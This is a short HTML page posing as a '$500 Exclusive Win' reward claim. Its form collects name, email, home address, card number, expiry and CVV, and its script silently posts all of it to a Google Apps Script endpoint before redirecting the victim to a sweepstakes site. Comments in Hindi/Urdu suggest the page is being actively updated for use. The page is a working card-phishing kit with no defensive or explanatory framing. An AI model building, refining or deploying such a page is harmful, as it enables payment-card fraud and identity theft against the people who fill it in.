<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardsHub - $500 Exclusive Win</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
        :root { --bg-color: #0a0f1c; --form-bg: #141c2e; --primary-glow: #8a2be2; --secondary-glow: #ff007f; --accent: #00ffcc; --text-main: #ffffff; --text-muted: #a0b8ff; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { background: radial-gradient(circle at center, #0a0f1c 0%, #05070f 100%); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        /* CSS wahi purani use karein jo aapke paas thi... */
    </style>
</head>
<body>
    <form id="leadForm" name="leadForm">
        <div class="row">
            <div class="input-group"><label>First Name</label><input type="text" name="firstName" required></div>
            <div class="input-group"><label>Last Name</label><input type="text" name="lastName" required></div>
        </div>
        <div class="input-group"><label>Email Address</label><input type="email" name="email" required></div>
        <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
        <div class="input-group"><label>Full Delivery Address</label><input type="text" name="address" required></div>
        <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
        <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" maxlength="19" required></div>
        <div class="row">
            <div class="input-group"><label>Expiry Date</label><input type="text" name="expiry" maxlength="5" required></div>
            <div class="input-group"><label>CVV / CVC</label><input type="password" name="cvv" maxlength="4" required></div>
        </div>
        <button type="submit" class="submit-btn" id="submitBtn">Verify & Claim Reward</button>
    </form>

    <script>
        // Yahan naya URL update kar diya gaya hai
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwbP79qBP7zWgz4pmPTsP1Xg8sGQ1-HxdfUmTPUOgs-x_KfsrUUxAPKa5ORJqdmkuny/exec';
        const form = document.forms['leadForm'];
        const submitBtn = document.getElementById('submitBtn');

        form.addEventListener('submit', e => {
            e.preventDefault();
            submitBtn.innerHTML = 'Verifying... ⏳';
            submitBtn.disabled = true;

            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                .then(response => {
                    window.location.href = 'https://play.sweepstakesalerts.com/win-5000';
                })
                .catch(error => {
                    window.location.href = 'https://play.sweepstakesalerts.com/win-5000';
                });
        });
    </script>
</body>
</html>
